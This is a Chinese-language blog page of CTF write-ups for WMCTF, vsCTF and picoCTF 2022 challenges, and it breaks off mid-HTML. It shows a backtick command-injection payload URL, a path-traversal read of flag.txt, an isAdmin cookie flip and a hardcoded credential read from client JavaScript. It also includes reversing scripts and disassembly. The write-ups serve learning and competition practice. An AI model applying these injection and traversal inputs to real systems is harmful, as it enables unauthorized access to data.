  <time class="dt-published" datetime="2022-08-26T03:07:10.000Z" itemprop="datePublished">2022-08-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/08/26/wmctf2022/">2022 WMCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="babaydriver-rev"><a href="#babaydriver-rev" class="headerlink" title="babaydriver-rev"></a>babaydriver-rev</h2><p>64bit的一个Windows Driver逆向</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> __fastcall <span class="title">sub_1400062A0</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+38h] [rbp-110h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">28</span>]; <span class="comment">// [rsp+50h] [rbp-F8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="built_in">sizeof</span>(v5));</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0x123456111</span>i64;</span><br><span class="line">  v5[<span class="number">1</span>] = a1;</span><br><span class="line">  v5[<span class="number">2</span>] = a2;</span><br><span class="line">  v5[<span class="number">3</span>] = a3;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="built_in">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">NtQueryInformationFile</span>(qword_140090048, v4, v5, <span class="number">0xE0</span>i64, <span class="number">0x34</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad,unpad</span><br><span class="line"></span><br><span class="line">a= [<span class="number">0xef</span>,<span class="number">0x76</span>,<span class="number">0xd5</span>,<span class="number">0x41</span>,<span class="number">0x86</span>,<span class="number">0x57</span>,<span class="number">0x5a</span>,<span class="number">0x8e</span>,<span class="number">0xc2</span>,<span class="number">0xb8</span>,<span class="number">0xb6</span>,<span class="number">0xee</span>,<span class="number">0x8</span>,<span class="number">0x56</span>,<span class="number">0xb9</span>,<span class="number">0xb8</span>,<span class="number">0xe</span>,<span class="number">0x40</span>,<span class="number">0x75</span>,<span class="number">0x21</span>,<span class="number">0x41</span>,<span class="number">0x4b</span>,<span class="number">0x15</span>,<span class="number">0x71</span>,<span class="number">0x2c</span>,<span class="number">0x9b</span>,<span class="number">0x5e</span>,<span class="number">0x64</span>,<span class="number">0x35</span>,<span class="number">0x5b</span>,<span class="number">0x4a</span>,<span class="number">0x58</span>]</span><br><span class="line">a = <span class="built_in">bytearray</span>(a)</span><br><span class="line"></span><br><span class="line">b=[<span class="number">0</span>]*<span class="number">0x20</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">  b[i]=<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)^i</span><br><span class="line">  <span class="comment"># for j in range(0x20,0x80):</span></span><br><span class="line">    <span class="comment"># if j^i==a[i]:</span></span><br><span class="line">  <span class="comment"># print(i,hex(ord(&#x27;0&#x27;)^i))</span></span><br><span class="line">b = <span class="built_in">bytearray</span>(b)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;Welcome_To_WMCTF&#x27;</span></span><br><span class="line"></span><br><span class="line">aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line"><span class="comment"># d = aes.encrypt(b)</span></span><br><span class="line">d = aes.decrypt(a)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">f=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x80</span>):</span><br><span class="line">    <span class="keyword">if</span> j^i==d[i]:</span><br><span class="line">      f+=<span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/08/26/wmctf2022/" data-id="cuidpaVmFtR6bwiT2KaW5EgTo" data-title="2022 WMCTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-vsctf2022" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/17/vsctf2022/" class="article-date">
  <time class="dt-published" datetime="2022-07-17T03:07:10.000Z" itemprop="datePublished">2022-07-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/17/vsctf2022/">2022 vsCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <ul>
<li><h3 id="web-sanity-check"><a href="#web-sanity-check" class="headerlink" title="web-sanity check"></a>web-sanity check</h3></li>
<li><h3 id="rev-binaryflood"><a href="#rev-binaryflood" class="headerlink" title="rev-binaryflood"></a>rev-binaryflood</h3><ul>
<li><pre><code class="language-cpp">__int64 __fastcall sub_40147F(char *a1, char *a2)
{
char v3; // [rsp+1Fh] [rbp-51h] BYREF
char a1a[32]; // [rsp+20h] [rbp-50h] BYREF
char v5[40]; // [rsp+40h] [rbp-30h] BYREF

std::allocator&lt;char&gt;::allocator(&amp;v3);
std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(a1, &amp;unk_40400A, &amp;v3);
std::allocator&lt;char&gt;::~allocator(&amp;v3);
if ( a2 )
{
  sub_40147F(a1a, *((char **)a2 + 1));
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(a1, a1a);
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(a1a);
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(a1, (unsigned int)*a2);
  sub_40147F(v5, *((char **)a2 + 2));
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(a1, v5);
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v5);
}
return (__int64)a1;
}
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* ### web-babyeval</span><br><span class="line">  *   ```bash</span><br><span class="line">      https://babyeval-twekqonvua-uc.a.run.app/?payload=directory`flag`</span><br></pre></td></tr></table></figure>

  得到flag

  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsctf&#123;regExAin’tGoodEnufForWAF&#125;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</li>
<li><h3 id="web-babywasm"><a href="#web-babywasm" class="headerlink" title="web-babywasm"></a>web-babywasm</h3><ul>
<li><p>这段是rust写的webassembly的编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">(func $memcmp (;244;) (param $var0 i32) (param $var1 i32) (param $var2 i32) (result i32)</span><br><span class="line">  (local $var3 i32) (local $var4 i32) (local $var5 i32)</span><br><span class="line">  i32.const 0</span><br><span class="line">  local.set $var3</span><br><span class="line">  block $label0</span><br><span class="line">    local.get $var2</span><br><span class="line">    i32.eqz</span><br><span class="line">    br_if $label0</span><br><span class="line">    block $label1</span><br><span class="line">      loop $label2</span><br><span class="line">        local.get $var0</span><br><span class="line">        i32.load8_u</span><br><span class="line">        local.tee $var4</span><br><span class="line">        local.get $var1</span><br><span class="line">        i32.load8_u</span><br><span class="line">        local.tee $var5</span><br><span class="line">        i32.ne</span><br><span class="line">        br_if $label1</span><br><span class="line">        local.get $var0</span><br><span class="line">        i32.const 1</span><br><span class="line">        i32.add</span><br><span class="line">        local.set $var0</span><br><span class="line">        local.get $var1</span><br><span class="line">        i32.const 1</span><br><span class="line">        i32.add</span><br><span class="line">        local.set $var1</span><br><span class="line">        local.get $var2</span><br><span class="line">        i32.const -1</span><br><span class="line">        i32.add</span><br><span class="line">        local.tee $var2</span><br><span class="line">        i32.eqz</span><br><span class="line">        br_if $label0</span><br><span class="line">        br $label2</span><br><span class="line">      end $label2</span><br><span class="line">    end $label1</span><br><span class="line">    local.get $var4</span><br><span class="line">    local.get $var5</span><br><span class="line">    i32.sub</span><br><span class="line">    local.set $var3</span><br><span class="line">  end $label0</span><br><span class="line">  local.get $var3</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">  (func $func373 (param $var0 i32) (param $var1 i32) (param $var2 i32) (param $var3 i32) (result i32)</span><br><span class="line">  (local $var4 i32)</span><br><span class="line">  i32.const 0</span><br><span class="line">  local.set $var4</span><br><span class="line">  block $label0</span><br><span class="line">    local.get $var1</span><br><span class="line">    local.get $var3</span><br><span class="line">    i32.ne</span><br><span class="line">    br_if $label0</span><br><span class="line">    local.get $var0</span><br><span class="line">    local.get $var2</span><br><span class="line">    local.get $var1</span><br><span class="line">    call $memcmp</span><br><span class="line">    i32.eqz</span><br><span class="line">    local.set $var4</span><br><span class="line">  end $label0</span><br><span class="line">  local.get $var4</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><h3 id="pwn-ezorange"><a href="#pwn-ezorange" class="headerlink" title="pwn-ezorange"></a>pwn-ezorange</h3><ul>
<li><pre><code class="language-cpp">/* Safe-Linking:
   Use randomness from ASLR (mmap_base) to protect single-linked lists
   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the
   lists&#39; chunks, and also perform allocation alignment checks on them.
   This mechanism reduces the risk of pointer hijacking, as was done with
   Safe-Unlinking in the double-linked lists of Small-Bins.
   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
   larger pages provide less entropy, although the pointer mangling
   still works.  */
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
</code></pre>
</li>
<li>并且<code>sysmalloc</code>直接通过<code>_int_free</code>释放掉了，所以<code>__free_hook</code>没用</li>
<li></li>
</ul>
</li>
<li><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/07/17/vsctf2022/" data-id="cuidpIYpu52vj4i0ijikTL2iQ" data-title="2022 vsCTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2022picoctfctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/04/09/2022picoctfctf/" class="article-date">
  <time class="dt-published" datetime="2022-04-09T03:07:10.000Z" itemprop="datePublished">2022-04-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/04/09/2022picoctfctf/">picoctf2022</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="include-web"><a href="#include-web" class="headerlink" title="include-web"></a>include-web</h2><p>在script.js和style.css中藏了两部分的flag</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* style.css */</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: lightblue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  picoCTF&#123;1nclu51v17y_1of2_  */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>script.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">greetings</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;This code is in a separate file!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  f7w_2of2_f4593d9d&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>拼起来：<code>picoCTF{1nclu51v17y_1of2_f7w_2of2_f4593d9d}</code></p>
<h2 id="inspect-HTML-web"><a href="#inspect-HTML-web" class="headerlink" title="inspect HTML-web"></a>inspect HTML-web</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.21.6</span><br><span class="line">Date: Thu, 07 Apr 2022 12:42:58 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 916</span><br><span class="line">Last-Modified: Tue, 15 Mar 2022 07:17:06 GMT</span><br><span class="line">Connection: close</span><br><span class="line">ETag: &quot;62303d72-394&quot;</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>On Histiaeus<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>On Histiaeus<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>However, according to Herodotus, Histiaeus was unhappy having to stay in</span><br><span class="line">       Susa, and made plans to return to his position as King of Miletus by </span><br><span class="line">       instigating a revolt in Ionia. In 499 BC, he shaved the head of his </span><br><span class="line">       most trusted slave, tattooed a message on his head, and then waited for </span><br><span class="line">       his hair to grow back. The slave was then sent to Aristagoras, who was </span><br><span class="line">       instructed to shave the slave&#x27;s head again and read the message, which </span><br><span class="line">       told him to revolt against the Persians.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> Source: Wikipedia on Histiaeus <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--picoCTF&#123;1n5p3t0r_0f_h7ml_dd513514&#125;--&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接藏在http的返回respone里面</p>
<p><code>picoCTF{1n5p3t0r_0f_h7ml_dd513514}</code></p>
<h2 id="Local-Authority-web"><a href="#Local-Authority-web" class="headerlink" title="Local Authority-web"></a>Local Authority-web</h2><p>输入<code>username</code>和<code>password</code></p>
<p>输入错误的请求在respone中有secure.js内容如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkPassword</span>(<span class="params">username, password</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>( username === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; password === <span class="string">&#x27;strongPassword098765&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以输入admin 和 strongPassword098765</p>
<p>得到flag <code>picoCTF{j5_15_7r4n5p4r3n7_6309e949}</code></p>
<h2 id="Search-source-web"><a href="#Search-source-web" class="headerlink" title="Search source-web"></a>Search source-web</h2><p>藏在style.css中</p>
<p><code>picoCTF{1nsp3ti0n_0f_w3bpag3s_227d64bd}</code></p>
<h2 id="Forbidden-Paths-web"><a href="#Forbidden-Paths-web" class="headerlink" title="Forbidden Paths-web"></a>Forbidden Paths-web</h2><p>相对路径读 <code>../../../../flag.txt</code></p>
<p>直接读到flag <code>picoCTF{7h3_p47h_70_5ucc355_26b22ab3}</code></p>
<h2 id="Powercookie-web"><a href="#Powercookie-web" class="headerlink" title="Powercookie-web"></a>Powercookie-web</h2><p>在cookie中有这样一条</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Value</th>
<th>Domain</th>
<th>Path</th>
<th>Expires&#x2F;Max Age</th>
<th>Size</th>
<th>HttpOnly</th>
<th>Secure</th>
<th>SameSite</th>
<th>Priority</th>
</tr>
</thead>
<tbody><tr>
<td>isAdmin</td>
<td>0</td>
<td>saturn.picoctf.net</td>
<td>1</td>
<td>Session</td>
<td>8</td>
<td></td>
<td></td>
<td></td>
<td>Medium</td>
</tr>
</tbody></table>
<p>把isAdmin修改为1即可顺利登陆得到flag</p>
<p><code>picoCTF{gr4d3_A_c00k13_dcb9f091}</code></p>
<h2 id="Roboto-Sans-web"><a href="#Roboto-Sans-web" class="headerlink" title="Roboto Sans-web"></a>Roboto Sans-web</h2><p>robots.txt</p>
<p><strong>robots协议也叫robots.txt</strong>（统一小写）是一种存放于网站根目录下的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/ASCII">ASCII</a>编码的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6">文本文件</a>，它通常告诉网络<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E">搜索引擎</a>的漫游器（又称<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E8%9C%98%E8%9B%9B">网络蜘蛛</a>），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%83%E6%95%B0%E6%8D%AE">元数据</a>（Metadata，又称元数据）。</p>
<p>robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</p>
<p>访问robots.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User-agent *</span><br><span class="line">Disallow: /cgi-bin/</span><br><span class="line">Think you have seen your flag or want to keep looking.</span><br><span class="line"></span><br><span class="line">ZmxhZzEudHh0;anMvbXlmaW</span><br><span class="line">anMvbXlmaWxlLnR4dA==</span><br><span class="line">svssshjweuiwl;oiho.bsvdaslejg</span><br><span class="line">Disallow: /wp-admin/</span><br></pre></td></tr></table></figure>

<p>anMvbXlmaWxlLnR4dA&#x3D;&#x3D;</p>
<p>js&#x2F;myfile.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;Who_D03sN7_L1k5_90B0T5_a4f5cc70&#125;</span><br></pre></td></tr></table></figure>

<h2 id="secrets-web"><a href="#secrets-web" class="headerlink" title="secrets-web"></a>secrets-web</h2><p>访问</p>
<p>&#96;&#96;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;hidden/file.css&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Finally. You almost found me. you are doing well<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://media1.tenor.com/images/0a6aff9f825af62c05adfbd75039cc7b/tenor.gif?itemid=4648337&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Something Like That GIF - Andy Parksandrecreation Wtf GIFs&quot;</span> <span class="attr">style</span>=<span class="string">&quot;max-width: 833px; background-color: rgb(151, 121, 85);&quot;</span> <span class="attr">width</span>=<span class="string">&quot;833&quot;</span> <span class="attr">height</span>=<span class="string">&quot;937.125&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>里面有一个<code>hiddlen/file.css</code>，访问一下得到css里面还有一个套娃</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>LOGIN<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- css --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;superhidden/login.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span 